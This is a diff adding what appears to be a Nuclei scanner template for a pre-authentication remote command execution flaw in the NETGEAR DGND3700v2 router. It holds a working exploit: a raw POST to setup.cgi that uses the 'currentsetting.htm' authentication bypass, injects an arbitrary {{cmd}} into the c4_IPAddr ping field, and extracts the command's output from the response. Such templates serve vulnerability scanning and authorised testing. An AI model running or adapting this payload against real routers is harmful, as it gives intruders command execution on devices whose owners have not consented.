@@ -1,0 +1,45 @@
+id: netgear-dgnd3700v2-rce
+info:
+  name: NETGEAR DGND3700v2 setup.cgi RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The NETGEAR DGND3700v2 setup.cgi endpoint is vulnerable to Remote Command Execution (RCE), allowing attackers to execute arbitrary commands on the server.
+  tags: rce, command-execution
+  reference:
+    - https://ssd-disclosure.com/ssd-advisory-netgear-dgnd3700v2-preauth-root-access/
+  classification:
+    cve-id: []
+    cvss-score: 10.0
+  metadata:
+    product: NETGEAR DGND3700v2
+    vul-type: command-execution
+    disclosure-date: 2022-02-21
+
+variables:
+  c4_IPAddr: "127 || echo 202cb962ac5 && {{cmd}} && echo 7152d234b70"
+
+http:
+  - raw:
+      - |
+        POST /setup.cgi?id=0&sp=1337foo=currentsetting.htm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        todo=ping_test&c4_IPAddr={{url_encode(c4_IPAddr)}}&next_file=diagping.htm
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(?s)202cb962ac5(.*)7152d234b70"
+    extractors:
+      - type: regex
+        group: 1
+        part: body
+        regex:
+          - "(?s)202cb962ac5(.*)7152d234b70"
